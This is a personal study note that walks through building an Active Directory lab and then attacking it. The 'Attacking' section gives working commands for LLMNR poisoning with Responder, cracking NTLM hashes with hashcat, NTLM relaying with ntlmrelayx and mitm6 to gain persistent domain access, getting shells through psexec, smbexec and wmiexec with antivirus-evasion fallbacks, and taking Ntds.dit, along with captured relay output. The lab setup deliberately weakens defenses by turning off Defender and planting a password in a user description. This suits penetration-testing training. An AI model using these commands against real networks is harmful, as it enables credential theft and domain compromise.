# Active Directory:
Evalutation Copies of Windows for testing purposes: 
https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server

alternative resource: 
1. https://evotec.xyz/the-only-powershell-command-you-will-ever-need-to-find-out-who-did-what-in-active-directory/
2. https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#active-directory-exploitation-cheat-sheet

## Domain Controller
1. hosts a copy of AD Directory Services directory store
2. provide authentication and authorization
3. replicate updates to other domain controllers in the domain and forest
4. allow administrative access to manage user accounts and network resources

## Domains: a way to group and manage objects in an organization
1. an administrative boundary for applying policies to groups of objects
2. a replication boundary for replicating data between domain controllers
3. an authentication and authorization boundary that proveides a way to limit the scope of access to resources. 

## Forest: a collection of one or more domain trees
1. share a common schema
2. share a common configuration partition
3. share a common global catalog to enable searching
4. enable trusts between all domains in the forest
5. share the Enterprise Admins and Schema Admins groups

## Oganizational Unit (OU): OUs are Active Directory containers that can contain users, groups, computers, and other OUs
1. represent your organization hierarchically and logically
2. manage a collection of objects in a consistent way
3. delegate permissions to administer groups of objects
4. apply policies

## Trusts: provide a mechanism for users to gain access to resources in another domain
1. all domians in a forest trust all other domains in the forest
2. trust can extend outside the forest

Directional Trust: the trust direction flows from trusting domain to to trusted domain

Transitive Trust: the trust relationship is extended beyond a two-domain trust to include other trusted domains 

## Objects:
1. User: enables network resource access for a user
2. InetOrgPerson: similar to user account, used for compatibility with other directory services
3. Contacts: Used primarily to assign e-mail addresses to external users, doesn't enable network access
4. Groups: used to simplify the administration of access controls
5. Computers: Enables authentication and auditing of computer access to resources
6. Printers: Used to simplify the process of locating and connecting to printers
7. Shared Folders: enables users to search for shared folders based on properties


**********************

## Active Directory Domain Controller Setup:
1. Install server using Windows server 2019 evaluation iso
2. Rename server (reboot)
4. Install Active Directory:
  - Manage > add Roles and Features > Next > Next > Next > Active Directory Domain Services > Next ... Install
6. Promote this server to a domain controller
  - After Installation has finished, look for Yellow Flag (Post-deployment Configuration)
5. Add a New Forest > Root Domain Name: MARVEL.local (Strat0m.com or whatever domain you want) > Create Password > Next > wait for Domain name to show up then choose Next > Next (can change NTDS location if wanted) > Next > Install
  - will automatically reboot server

## Active Directory Add File Share:
Server Manager > File and Storage Service (left pane)
Shares > Tasks (drop down window) > New Share... > SMBshare Quick > Next > Share Name: HackMe > Next > Next > Create (opens up ports 139 and 445)

## Create Service Prinicple Name (SPN): kerberoasting? 
CMD (run as administrator) 
```
setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 Marvel\SQLService
setspn -T MARVEL.local -Q */*
```
## Active Directory Add Group Policy: to turn of Defender Anti-Virus
1. Group Policy Management 
2. Forest: Marvel.local > Domains > Marvel.local
3. Right click Marvel.local and select "Create a GPO in this domian, and link it here..."
  - Name the GPO: Disable Windows Defender
4. Edit the GPO
  - in Left Pane: Computer Configuration > Policies > Administrative Templates: Policy deinitions (ADM) > Windows Components > Windows Defender Antivirus
  - in right pane: Turn off Windows Defender Antivirus > Enabled > Apply

## Active Directory Add Users:
1. Server Manager > Tools > Active Directory Users and Computers 
2. Move all Built-in Security Groups to their own area
  - right click Marvel.local > New > Organizational Unit > name it: Groups
  - Marvel.local > Users 
  - select all except (Administrator and Guest) and move them to the newly greated Groups folder (note down arrow means account has been disabled)
3. right click Marvel.local > New > User (create various users with different levels of access for testing purposes, add a description that includes a password to one account)

## Setting up LDAPS:
1. Server Manager > Manage > add roles and features
2. Next > Next > Next > Active Directory Certificate Services > Next > Next > Next Check Certifcation Authority (Role Services) > Restart the destination server automatically > Yes > Install
3. Yellow Flag at top (Refresh Dashboard if needed) >  Configure Active Directory Certificate Services
4. Next > Check "Certification Authority"  > Next > Next > Next ... Valid Period set to: 99 years > Next > Next > Configure


## Windows 10 connected to Active Directory Domain Controller:
1. Install Windows 10 using evaluation iso 
2. Add User with "Domain Join Instead" (bottom left corner) 
  - This user won't matter once we are joined to the domain
4. Rename computer (reboot)
5. Add File Share (for exploitation purposes)
6. Join to Domain
  - Change DNS settings to point to Domain Controller IP 
  - Start menu > Type: Domain > Access work or school > Connect > Join this Device to a Local Active Directory Domain 
  - Domain Name: Marvel.local 
  - Use Administrator username and password
  - Skip add an account option
  - Restart Now

## Set user as local admin on Winodws 10 PC
1. Login as Administrator 
2. Right click start menu > Computer Management > Local Users and Groups > Groups > Administrators
3. check user name that you want to make admin > OK > Apply

## Windows 10 allow Network discovery
1. Open File Explorer
2. Click Network in the left Pane
3. Clcik "OK" to allowing Network discovery
4. At the top of Explorer: "Turn on network discovery and file sharing"

**********************
# Attacking:
### Data Store:
```
%SystemRoot%\NTDS\Ntds.dit
C:\Windows\NTDS\Ntds.dit
```
always check for this file and grab it. only accessible through the domian controller and contains everything in Active Directory. 


## LLMNR Poisoning: 
#### Responder:
gather hashes over the network passively 
```
sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v 
```
```
-I interface
-r enable answers for netbios wredir suffix queries
-d enable answers for netbios domain suffix queries
-w start the WPAD rogue proxy server
-v verbose
```
save hashses to file called hashes.txt

#### Hashcat:
using the password file rockyou.txt and the NTLM module to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```
using the password file rockyou.txt to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```

$ hashcat --help | grep SHA

```
   5500 | NetNTLMv1                                        | Network Protocols
   5500 | NetNTLMv1+ESS                                    | Network Protocols
   5600 | NetNTLMv2                                        | Network Protocols
   1000 | NTLM                                             | Operating Systems
   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
    100 | SHA1                                             | Raw Hash
  17400 | SHA3-256                                         | Raw Hash
  17500 | SHA3-384                                         | Raw Hash
  17600 | SHA3-512                                         | Raw Hash
```


##### LLMNR Poisoning Defense:
1. Disable LLMNR
2. Disable NBT-NS
3. Require Network Access Control
4. Require strong passwords (phrases) more than 14 characters


## SMB attacks: How do I get Victim to try connecting to attack machine SMB??
edit: /usr/share/responder/Responder.conf
```
SMB = Off
HTTP = Off
```
everything else stays on

#### NMAP
check for open SMB port and check for SMB signing
```
sudo nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
```
look for smb2 enabled but not required (default for desktops)

### ntmlrelayx.py
1. installed with impacket
2. run while responder is running
```
ntmlrelayx.py -tf targets.txt -smb2support -i
```

```
-i interact
-e example.exe: execute example.exe
-c ls: run command ls
```
looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 

#### connecting: requires having cracked a hash
1. can use MSFconsole to attack the tartget using exploit/windows/smb/psexec
2. if that is getting stopped by antivirus try psexec.py 
``` psexec.py <domain>.local/<user>:<password>@<ip-address> ```
3. if that is getting stopped by antivirus try smbexec.py 
``` smbexec.py <domain>.local/<user>:<password>@<ip-address> ```
4. if that is getting stopped by antivirus try wmiexec.py 
``` wmiexec.py <domain>.local/<user>:<password>@<ip-address> ```
5. there is also a powershell version of psexec and other options that might be able to do the same thing. 

## IPv6: mitm6
1. install from github
```
cd /opt; git clone https://github.com/fox-it/mitm6.git; cd mitm6
```
2. get Domain Controller IP 
Domain controllers will show port 389 running the Microsoft Windows AD LDAP service:
```
nmap -p389 -sV <IP-range>
```
Expected Output:
```
PORT    STATE SERVICE VERSION 
389/tcp open  ldap    Microsoft Windows AD LDAP (Domain:TESTDOMAIN, Site: TEST) 
```
OR:
```
nmap -p 389 -T4 -A -v --script ldap-rootdse <IP-range>
```
3. get Domain name using nmap
```
nmap --script smb-enum-domains.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-domains.nse -p U:137,T:139 <host>
```
OR:
```
nmap --script smb-os-discovery.nse -p445 127.0.0.1
sudo nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 127.0.0.1
```

4. run mitm6
```
sudo python mitm6.py -i eth0 -d <domain>.local
```

5. run ntmlrelayx.py at the same time
```
ntmlrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.<domain>.local -l lootme
```
6. check on results:
all captured info will be saved to lootme folder in the directory you ran this command. when someone logs in to a computer on the network this will try to create a user and acl for persistent access. 
```
firefox ./lootme/domain_users.html
```
Always check for passwords in the description. 

#### ntmlrelayx.py output:
```
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user.
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user, aborting.
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab?556e691713fe650f
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\FRANK1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/pinrulesstl.cab?efa3d58d57c7e857
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\Administrator SUCCEED
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\FRANK1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] Authenticating against ldaps://192.168.1.7 as WONDERLAND\Administrator SUCCEED
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: login.live.com:443
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.1.10, attacking target ldaps://192.168.1.7
[*] HTTPD: Client requested path: login.live.com:443

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {b'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {b'\x15\x00\x00\x00bY\xecY\x80\xf3\xbb%\xb2r\x8d\x07\x07\x02\x00\x00'}
    }
}

```

## DNS take over:


## Domain Enumeration: 
### Powerview: 
### Bloodhound: 
1. https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/
2. https://github.com/BloodHoundAD/BloodHound

Install: 
```
sudo apt install BloodHound
```



## Pass the hash: 


## CrackMapExec:
https://mpgn.gitbook.io/crackmapexec/

## SecretsDump.py:


## Token Impersonation:


## kerberoasting:
https://attack.mitre.org/techniques/T1558/003/

Kerberoasting is a post-exploitation attack that extracts service account credential hashes from Active Directory for offline cracking.



## GPP:


## MimiKatz:
https://github.com/gentilkiwi/mimikatz/wiki

## Golden Ticket: 





